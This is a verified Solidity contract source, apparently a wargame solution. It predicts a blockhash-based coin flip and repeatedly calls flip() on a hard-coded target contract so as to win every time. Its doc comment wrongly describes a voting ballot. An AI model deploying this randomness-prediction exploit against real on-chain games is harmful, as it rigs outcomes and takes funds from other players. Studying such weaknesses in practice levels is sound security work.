/**
 *Submitted for verification at Etherscan.io on 2022-09-07
*/

// File: contracts/FlipContract.sol

pragma solidity >=0.8.0 <0.9.0;

interface FlipContract {
  function consecutiveWins (  ) external view returns ( uint256 );
  function flip ( bool _guess ) external returns ( bool );
}
// File: contracts/SafeMath.sol

pragma solidity >=0.7.0 <0.9.0;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
// File: contracts/FlippingCrazy.sol

pragma solidity >=0.8.0 <0.9.0;



/** 
 * @title Ballot
 * @dev Implements voting process along with vote delegation
 */
contract FlippingCrazy {

    constructor(){

    }
    using SafeMath for uint256;
    address private flipContractAddress =
        address(0x989cdF707EF0dFc66C4d31E2fE6dFA20FF3D9CC3);

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip() public returns (bool) {
            uint256 blockValue = uint256(blockhash(block.number.sub(1)));

            uint256 coinFlip = blockValue.div(FACTOR);
            bool side = coinFlip == 1 ? true : false;

            return side;
    }

    function flipTenTimes() public {
        for(uint256 i = 0; i < 10; i++){
            bool flipValue = flip();
            FlipContract(flipContractAddress).flip(flipValue);
        }
    }     
}